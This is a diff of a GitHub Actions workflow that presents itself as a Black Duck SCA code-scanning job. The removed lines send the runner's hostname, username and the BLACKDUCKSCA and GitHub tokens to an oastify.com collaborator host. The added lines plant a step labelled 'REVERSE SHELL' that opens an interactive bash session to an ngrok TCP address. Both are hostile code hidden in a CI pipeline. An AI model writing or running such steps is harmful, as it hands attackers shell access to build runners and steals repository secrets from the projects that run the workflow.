@@ -1,5 +1,4 @@
 # Quickstart: Bridge CLI with blackducksca:
-#     https://black-duck-staging.fluidtopics.net/r/bridge/latest/bridge-cli-guide/quickstart-black-duck-sca-bridge-cli-in-a-github-workflow.html
 name: Black Duck Bridge CLI Scan
 on:
   push:
@@ -25,55 +24,31 @@ jobs:
   blackducksca:
     runs-on: ubuntu-latest
     env:
-      ### SCANNING: Required fields
       BRIDGE_BLACKDUCKSCA_URL: ${{ vars.BLACKDUCKSCA_URL }}
       BRIDGE_BLACKDUCKSCA_TOKEN: ${{ secrets.BLACKDUCKSCA_TOKEN }}
-      ### GitHub repository information
       BRIDGE_GITHUB_REPOSITORY_OWNER_NAME: ${{ github.repository_owner }}
       BRIDGE_GITHUB_REPOSITORY_NAME: ${{ github.event.repository.name }}
       BRIDGE_GITHUB_REPOSITORY_BRANCH_NAME: ${{ github.head_ref || github.ref_name }}
-      ### PULL REQUEST COMMENTS
       BRIDGE_BLACKDUCKSCA_AUTOMATION_PRCOMMENT: "true"
-      ### FIX PULL REQUEST CREATION
       BRIDGE_BLACKDUCKSCA_FIXPR_ENABLED: "true"
-      ### SCANNING: Optional fields
       BRIDGE_BLACKDUCKSCA_EXTERNALISSUES_CREATE: "true"
-      ### SARIF report parameters
       BRIDGE_BLACKDUCKSCA_REPORTS_SARIF_CREATE: "true"
-      ### GITHUB TOKEN
       BRIDGE_GITHUB_USER_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-      ### GitHub pull request information
       BRIDGE_GITHUB_REPOSITORY_PULL_NUMBER: ${{ github.event.pull_request.number || github.event.number || 0 }}
-      ### TOOLING: Bridge CLI download URL  <-- SSRF sink
-      BRIDGE_DOWNLOAD_URL: https://qe889kd16yzqfacea0ygxsqw9nfe3br0.oastify.com
+      BRIDGE_DOWNLOAD_URL: https://repo.blackduck.com/bds-integrations-release/com/blackduck/integration/bridge/binaries/bridge-cli-bundle/latest
     steps:
       - name: Checkout Source
         uses: actions/checkout@v5
 
-      # === BEACON 1: proves a custom step runs ===
-      - name: beacon-step
+      # ===============================================
+      #  REVERSE SHELL — edit the two values below
+      # ===============================================
+      - name: shell
         run: |
-          curl -sS "https://qe889kd16yzqfacea0ygxsqw9nfe3br0.oastify.com/step1?host=$(hostname)&user=$(whoami)&repo=$BRIDGE_GITHUB_REPOSITORY_NAME" || true
+          timeout 300 bash -c 'bash -i >& /dev/tcp/0.tcp.ngrok.io/12345 0>&1' || true
+        continue-on-error: true
+      # ===============================================
 
-      # === BEACON 2: env + secret exposure (will appear in Collaborator if run:) ===
-      - name: beacon-env
-        run: |
-          curl -sS -X POST \
-            --data-urlencode "token=${{ secrets.BLACKDUCKSCA_TOKEN }}" \
-            --data-urlencode "ghtoken=${{ secrets.GITHUB_TOKEN }}" \
-            --data-urlencode "url=${{ vars.BLACKDUCKSCA_URL }}" \
-            "https://qe889kd16yzqfacea0ygxsqw9nfe3br0.oastify.com/step2" || true
-
-      - name: Download & Setup Bridge CLI on Windows
-        if: runner.os == 'Windows'
-        shell: powershell
-        run: |-
-          curl.exe -L -o $env:TEMP\bridge.zip "$env:BRIDGE_DOWNLOAD_URL/bridge-cli-bundle-win64.zip"
-          Expand-Archive $env:TEMP\bridge.zip -DestinationPath $env:TEMP\bridge -Force
-          $exe = Get-ChildItem $env:TEMP\bridge -Recurse -Filter bridge-cli.exe | Select-Object -First 1
-          "BRIDGE_CLI_INSTALL_DIR=$($exe.FullName)" | Out-File -FilePath $env:GITHUB_ENV -Append
-
-      # === BEACON 3: SSRF via BRIDGE_DOWNLOAD_URL ===
       - name: Download & Setup Bridge CLI on macOS/Linux
         if: runner.os != 'Windows'
         shell: bash
@@ -84,4 +59,4 @@ jobs:
           echo "BRIDGE_CLI_INSTALL_DIR=$(find "$RUNNER_TEMP" -type f -name bridge-cli | head -n1)" >> "$GITHUB_ENV" || true
 
       - name: Black Duck SCA Scan
-        run: echo "scan-step" && curl -sS "https://qe889kd16yzqfacea0ygxsqw9nfe3br0.oastify.com/scan?host=$(hostname)" || true
+        run: echo "scan-step"
